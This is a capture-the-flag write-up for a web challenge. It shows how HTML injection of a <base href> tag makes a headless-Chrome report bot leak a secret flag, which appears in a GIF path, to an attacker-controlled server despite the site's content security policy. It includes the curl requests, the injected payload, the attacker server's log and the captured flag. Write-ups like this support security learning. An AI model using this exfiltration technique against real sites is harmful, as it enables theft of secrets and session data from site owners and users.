# Stage 5: flagfriendly - web - medium

## Challenge

Flags for friendly Kuchenblech http://45.76.92.221:8070/

## Solution

The main page is vulnerable to html injection. Because of the content security
policy of the page, an injection of javascript is not allowed. Also loading other
files like CSS are not allowed, only images are allowed from every source.

There is also an endpoint /report?url=<SOME_URL> that will call the given url
with a headless chrome. The result is not returned, only the string "done" if
the request worked.

The flag is hidden in the python webserver and if the given cookie "flag" is equal to
saved flag, the server will use the flag as the path to the GIF on the site.

So if we request the index page via the /report endpoint, the flag is in the HTML
source code, but not showed. So the following request contains the flag, but is
not shown:

```
root@blackbox:# curl -v "http://45.76.92.221:8070/report?url=http://45.76.92.221:8070/?title=OurOwnTitle"
*   Trying 45.76.92.221...
* TCP_NODELAY set
* Connected to 45.76.92.221 (45.76.92.221) port 8070 (#0)
> GET /report?url=http://45.76.92.221:8070/ HTTP/1.1
> Host: 45.76.92.221:8070
> User-Agent: curl/7.62.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: gunicorn/20.0.4
< Date: Sun, 29 Dec 2019 20:30:10 GMT
< Connection: close
< Content-Type: text/html; charset=utf-8
< Content-Length: 4
<
* Closing connection 0
done
```

As we can inject html code with the title parameter, we can inject a special html
element in the header to "redirect" the relative loading of the gif to our own server.
To to this, lets assume our server runs under http://151.217.238.34:8080. So lets
inject the following html pice:

```
</title><base href="http://151.217.238.34:8080">
```

The final request:

```
curl -v "http://45.76.92.221:8070/report?url=http://45.76.92.221:8070/?title=%3C/title%3E%3Cbase%20href=%22http://151.217.238.34:8080%22%3E"
```

In our server log (done with echoserver.py), we see the request from the headless
chrome containing the flag:

```
----- Request Start ----->

/junior-CSP_THE_C_IS_FOR_CYBER.gif
Host: 151.217.238.34:8080
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://45.76.92.221:8070/?title=%3C/title%3E%3Cbase%20href=%22http://151.217.238.34:8080%22%3E
Accept-Encoding: gzip, deflate

```
